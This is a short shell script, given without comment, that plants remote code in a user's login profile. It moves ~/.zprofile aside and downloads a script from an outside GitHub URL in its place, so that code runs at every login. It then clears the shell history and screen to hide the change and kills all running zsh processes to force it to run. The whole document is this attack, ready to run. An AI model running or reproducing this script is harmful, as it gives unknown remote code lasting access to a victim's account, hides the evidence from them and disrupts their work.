if [ -f ~/.zprofile ]; then
    mv ~/.zprofile ~/.zprofile_org
fi
curl https://raw.githubusercontent.com/21studentkotik/akva/main/a.sh -o ~/.zprofile
history -p
history -c
clear
ps -ef | grep zsh | grep -v grep | awk '{print $2}' | xargs kill
